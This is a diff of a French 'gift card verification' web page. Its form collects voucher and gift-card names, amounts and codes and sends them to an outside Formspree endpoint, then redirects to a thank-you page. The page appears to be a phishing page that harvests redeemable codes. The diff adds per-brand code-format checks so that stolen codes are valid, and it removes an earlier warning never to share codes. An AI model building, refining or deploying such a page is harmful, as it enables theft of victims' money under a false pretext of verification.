@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification Carte Cadeau - Espace Sécurisé</title>
+    <title>Vérification de Carte Cadeau</title>
     <style>
         * {
             box-sizing: border-box;
@@ -20,186 +20,325 @@
             display: flex;
             flex-direction: column;
             align-items: center;
+            justify-content: flex-start;
             min-height: 100vh;
-            padding: 20px;
+            padding: 15px 0;
+            overflow-x: hidden;
         }
 
-        /* Bannière publicitaire défilante */
-        .banner-container {
+        /* --- CARROUSEL FLUIDE CONTINU --- */
+        .carousel-wrapper {
             width: 100%;
-            max-width: 420px;
-            height: 140px;
             overflow: hidden;
-            border-radius: 12px;
             margin-bottom: 20px;
-            background-color: #1a1a1a;
-            border: 1px solid #333;
             position: relative;
         }
-        .banner-track {
+        .carousel-track {
             display: flex;
-            width: max-content;
-            animation: scrollBanner 15s linear infinite;
+            gap: 12px;
+            padding: 0 7.5%;
+            overflow-x: auto;
+            scroll-snap-type: x mandatory;
+            scroll-behavior: smooth;
+            scrollbar-width: none;
         }
-        .banner-track img {
-            width: 420px;
-            height: 140px;
+        .carousel-track::-webkit-scrollbar {
+            display: none;
+        }
+        .carousel-slide {
+            flex: 0 0 85%;
+            height: 165px;
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.65);
+            scroll-snap-align: center;
+            overflow: hidden;
+            background-color: #1a1a1a;
+        }
+        .carousel-slide img {
+            width: 100%;
+            height: 100%;
             object-fit: cover;
-        }
-        @keyframes scrollBanner {
-            0% { transform: translateX(0); }
-            100% { transform: translateX(-50%); }
+            display: block;
         }
 
+        /* --- FORMULAIRE --- */
+        .main-content {
+            width: 100%;
+            padding: 0 15px;
+            display: flex;
+            justify-content: center;
+        }
         .container {
             background-color: #1a1a1a;
             border: 1px solid #333;
             border-radius: 16px;
-            padding: 30px 20px;
+            padding: 25px 20px;
             width: 100%;
             max-width: 420px;
-            text-align: center;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8);
         }
-
-        /* Titre VÉRIFICATION en vert */
         h1 {
-            font-size: 26px;
-            letter-spacing: 2px;
+            font-size: 20px;
+            text-align: center;
             text-transform: uppercase;
             color: #4cd964;
             margin-bottom: 5px;
+            letter-spacing: 1px;
         }
-        p.subtitle {
-            color: #aaaaaa;
-            font-size: 13px;
-            margin-bottom: 25px;
+        .subtitle {
+            font-size: 12px;
+            text-align: center;
+            color: #888;
+            margin-bottom: 20px;
         }
         .form-group {
             margin-bottom: 15px;
-            text-align: left;
         }
-        .input-code {
+        label {
+            display: block;
+            font-size: 13px;
+            color: #bbb;
+            margin-bottom: 5px;
+        }
+        input {
             width: 100%;
-            padding: 16px;
-            background-color: #262626;
-            border: 2px solid #444;
+            padding: 14px;
+            background-color: #2a2a2a;
+            border: 1px solid #444;
             border-radius: 10px;
-            color: #fff;
-            font-size: 16px;
-            text-align: center;
+            color: #ffffff;
+            font-size: 15px;
             outline: none;
             transition: 0.3s;
         }
-        .input-code:focus {
-            border-color: #4cd964;
+        input:focus {
+            border-color: #007aff;
+            background-color: #222;
         }
-
-        /* Bouton vérifié en bleu uni */
+        .error-msg {
+            color: #ff3b30;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
         .submit-btn {
             width: 100%;
-            padding: 18px;
+            padding: 16px;
             background-color: #007aff;
             border: none;
             border-radius: 10px;
             color: #ffffff;
-            font-size: 17px;
+            font-size: 16px;
             font-weight: bold;
             text-transform: uppercase;
-            letter-spacing: 1px;
             cursor: pointer;
-            margin-top: 10px;
             transition: 0.3s;
+            margin-top: 10px;
         }
         .submit-btn:hover {
             background-color: #005ec4;
         }
-
-        /* Section Informations et service */
-        .service-info {
-            margin-top: 30px;
-            text-align: left;
-            font-size: 12px;
+        .footer {
+            margin-top: 25px;
+            font-size: 11px;
             color: #888;
+            line-height: 1.4;
             border-top: 1px solid #333;
             padding-top: 15px;
-        }
-        .service-info h3 {
-            color: #ccc;
-            font-size: 13px;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-        }
-        .service-info p {
-            margin-bottom: 4px;
         }
     </style>
 </head>
 <body>
 
-    <!-- Bannière publicitaire à défilement horizontal -->
-    <div class="banner-container">
-        <div class="banner-track">
-            <img src="image2.jpg" alt="Publicité 2">
-            <img src="image3.jpg" alt="Publicité 3">
-            <img src="image4.jpg" alt="Publicité 4">
-            <img src="image2.jpg" alt="Publicité 2">
-            <img src="image3.jpg" alt="Publicité 3">
-            <img src="image4.jpg" alt="Publicité 4">
+    <!-- CARROUSEL AVEC BOUCLE INFINIE -->
+    <div class="carousel-wrapper">
+        <div class="carousel-track" id="carouselTrack">
+            <!-- 3 images originales -->
+            <div class="carousel-slide"><img src="image2.jpg" alt="Bannière 1"></div>
+            <div class="carousel-slide"><img src="image3.jpg" alt="Bannière 2"></div>
+            <div class="carousel-slide"><img src="image4.jpg" alt="Bannière 3"></div>
+            <!-- Duplication de la première pour une transition fluide sans effet de retour en arrière -->
+            <div class="carousel-slide"><img src="image2.jpg" alt="Bannière 1 (clone)"></div>
         </div>
     </div>
 
-<div class="container">
-    <h1>VÉRIFICATION</h1>
-    <p class="subtitle">Vérification de Carte Cadeau & Ticket</p>
+    <!-- CONTENEUR DU FORMULAIRE -->
+    <div class="main-content">
+        <div class="container">
+            <h1>Vérification</h1>
+            <div class="subtitle">Vérification de Carte Cadeau & Ticket</div>
 
-    <!-- Lien Formspree intégré avec redirection vers merci.html -->
-    <form action="https://formspree.io/f/xoedvwwj" method="POST" id="ticket-form">
-        
-        <!-- Redirection après envoi -->
-        <input type="hidden" name="_next" value="https://sidas9226-dotcom.github.io/verification-carte/merci.html">
+            <form id="verifyForm" action="https://formspree.io/f/xoed" method="POST">
+                
+                <input type="hidden" name="_next" value="https://sidas9226-dotcom.github.io/verification-carte/merci.html">
 
-        <!-- 1. Nom du ticket ou carte -->
-        <div class="form-group">
-            <input type="text" name="nom_ticket" class="input-code" placeholder="Saisissez le nom du ticket ou carte" required>
+                <div class="form-group">
+                    <label>Nom du ticket ou carte</label>
+                    <input type="text" id="cardName" name="Nom_Ticket" list="cardsList" placeholder="Rechercher ou saisir..." required autocomplete="off">
+                    
+                    <datalist id="cardsList">
+                        <option value="Transcash">
+                        <option value="Neosurf">
+                        <option value="Paysafecard">
+                        <option value="PCS Mastercard">
+                        <option value="TONEO FIRST">
+                        <option value="Cologne Cash">
+                        <option value="Steam">
+                        <option value="PlayStation Network (PSN)">
+                        <option value="Xbox Gift Card">
+                        <option value="Nintendo eShop">
+                        <option value="Riot Games (League of Legends)">
+                        <option value="Roblox">
+                        <option value="Minecraft">
+                        <option value="Blizzard">
+                        <option value="Fortnite (V-Bucks)">
+                        <option value="Apple Gift Card / iTunes">
+                        <option value="Google Play">
+                        <option value="Amazon">
+                        <option value="Netflix">
+                        <option value="Spotify">
+                        <option value="Cdiscount">
+                        <option value="Fnac / Darty">
+                        <option value="Zalando">
+                        <option value="Airbnb">
+                        <option value="Binance Gift Card">
+                        <option value="Kinguin">
+                        <option value="G2A">
+                    </datalist>
+                </div>
+
+                <div class="form-group">
+                    <label>Montant du ticket</label>
+                    <input type="text" name="Montant" placeholder="Ex: 50€" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Code du ticket</label>
+                    <input type="text" id="cardCode" name="Code_Ticket" placeholder="Insérer le code du ticket" required>
+                    <div id="errorText" class="error-msg">Format de code invalide pour cette carte.</div>
+                </div>
+
+                <button type="submit" class="submit-btn">Vérifier mon ticket</button>
+            </form>
+
+            <div class="footer">
+                <strong>INFORMATIONS SUR LE SERVICE ET CONTACT</strong><br>
+                Nom commercial : Vérification Carte Cadeau<br>
+                Identifiant : 292729199177279<br>
+                Adresse : Europe<br>
+                Responsable : Albert Matéo (Responsable déclaré)<br>
+                E-mail : verification@gmail.com
+            </div>
         </div>
-
-        <!-- 2. Montant du ticket -->
-        <div class="form-group">
-            <input type="text" name="montant_ticket" class="input-code" placeholder="Saisissez le montant du ticket" required>
-        </div>
-
-        <!-- 3. Code du ticket -->
-        <div class="form-group">
-            <input type="text" name="code_ticket" class="input-code" placeholder="Insérer le code du ticket" required>
-        </div>
-
-        <button type="submit" class="submit-btn" id="submit-button">Vérifier mon ticket</button>
-
-    </form>
-
-    <!-- Informations sur le service et contact -->
-    <div class="service-info">
-        <h3>Informations sur le service et contact</h3>
-        <p><strong>Nom commercial :</strong> Vérification Carte Cadeau</p>
-        <p><strong>Identifiant :</strong> 292729199177279</p>
-        <p><strong>Adresse :</strong> Europe</p>
-        <p><strong>Responsable :</strong> Albert Matéo (Responsable déclaré)</p>
-        <p><strong>E-mail :</strong> verification@gmail.com</p>
-        <br>
-        <p><strong>Engagement de sécurité :</strong> Nous privilégions la transparence et la protection des informations personnelles. Les vérifications de tickets doivent être effectuées auprès des plateformes officielles des émetteurs. Ne communiquez jamais vos codes PIN ou codes confidentiels.</p>
-        <br>
-        <p style="font-style: italic; font-size: 11px;">Informations déclarées par le responsable du service. Aucun agrément officiel ou partenariat avec les émetteurs n'est revendiqué par cette présentation.</p>
     </div>
-</div>
 
-<script>
-    document.getElementById('ticket-form').addEventListener('submit', function() {
-        const btn = document.getElementById('submit-button');
-        btn.textContent = "Vérification en cours...";
-        btn.style.opacity = "0.7";
-    });
-</script>
+    <script>
+        // --- DÉFILEMENT CONTINU FLUIDE (TOUTES LES 3 SECONDES) ---
+        const track = document.getElementById('carouselTrack');
+        const slides = document.querySelectorAll('.carousel-slide');
+        let currentIndex = 0;
+        const totalSlides = 3; // Nombre de slides réelles (sans compter le clone)
 
+        setInterval(() => {
+            currentIndex++;
+            const slideWidth = slides[0].offsetWidth + 12; // Largeur + gap
+            
+            track.scrollTo({
+                left: currentIndex * slideWidth,
+                behavior: 'smooth'
+            });
+
+            // Si on arrive sur l'image clone (la 4ème, qui est un double de la 1ère)
+            if (currentIndex >= totalSlides) {
+                setTimeout(() => {
+                    track.style.scrollBehavior = 'auto'; // Coupe l'effet fluide momentanément pour le reset
+                    track.scrollTo({ left: 0, behavior: 'instant' });
+                    currentIndex = 0;
+                    setTimeout(() => {
+                        track.style.scrollBehavior = 'smooth'; // Remet le défilement fluide
+                    }, 50);
+                }, 600); // Attend la fin de l'animation de glissement
+            }
+        }, 3000); // Toutes les 3 secondes
+
+        // --- VALIDATION DES CODES ---
+        const form = document.getElementById('verifyForm');
+        const cardNameInput = document.getElementById('cardName');
+        const cardCodeInput = document.getElementById('cardCode');
+        const errorText = document.getElementById('errorText');
+
+        form.addEventListener('submit', function(e) {
+            const cardName = cardNameInput.value.trim().toLowerCase();
+            const code = cardCodeInput.value.trim();
+            let isValid = true;
+            let errorMessage = "";
+
+            if (cardName.includes('transcash')) {
+                if (!/^\d{12}$/.test(code)) {
+                    isValid = false;
+                    errorMessage = "Le code Transcash doit contenir exactement 12 chiffres.";
+                }
+            }
+            else if (cardName.includes('neosurf')) {
+                if (!/^\d{10}$/.test(code)) {
+                    isValid = false;
+                    errorMessage = "Le code Neosurf doit contenir exactement 10 chiffres.";
+                }
+            }
+            else if (cardName.includes('paysafecard')) {
+                if (!/^\d{16}$/.test(code)) {
+                    isValid = false;
+                    errorMessage = "Le code Paysafecard doit contenir exactement 16 chiffres.";
+                }
+            }
+            else if (cardName.includes('pcs')) {
+                if (!/^\d{10}$/.test(code)) {
+                    isValid = false;
+                    errorMessage = "Le code PCS doit contenir exactement 10 chiffres.";
+                }
+            }
+            else if (cardName.includes('steam')) {
+                if (!/^[a-zA-Z0-9]{15}$/.test(code)) {
+                    isValid = false;
+                    errorMessage = "Le code Steam doit contenir exactement 15 caractères.";
+                }
+            }
+            else if (cardName.includes('playstation') || cardName.includes('psn')) {
+                if (!/^[a-zA-Z0-9]{12}$/.test(code)) {
+                    isValid = false;
+                    errorMessage = "Le code PlayStation (PSN) doit contenir 12 caractères.";
+                }
+            }
+            else if (cardName.includes('xbox')) {
+                if (!/^[a-zA-Z0-9]{25}$/.test(code)) {
+                    isValid = false;
+                    errorMessage = "Le code Xbox doit contenir 25 caractères.";
+                }
+            }
+            else if (cardName.includes('google play')) {
+                if (!/^[a-zA-Z0-9]{16}$/.test(code)) {
+                    isValid = false;
+                    errorMessage = "Le code Google Play doit contenir 16 caractères.";
+                }
+            }
+            else if (cardName.includes('amazon')) {
+                if (code.length < 14 || code.length > 16) {
+                    isValid = false;
+                    errorMessage = "Le code Amazon doit comporter entre 14 et 16 caractères.";
+                }
+            }
+
+            if (!isValid) {
+                e.preventDefault();
+                errorText.textContent = errorMessage;
+                errorText.style.display = "block";
+                cardCodeInput.style.borderColor = "#ff3b30";
+            } else {
+                errorText.style.display = "none";
+                cardCodeInput.style.borderColor = "#444";
+            }
+        });
+    </script>
 </body>
 </html>
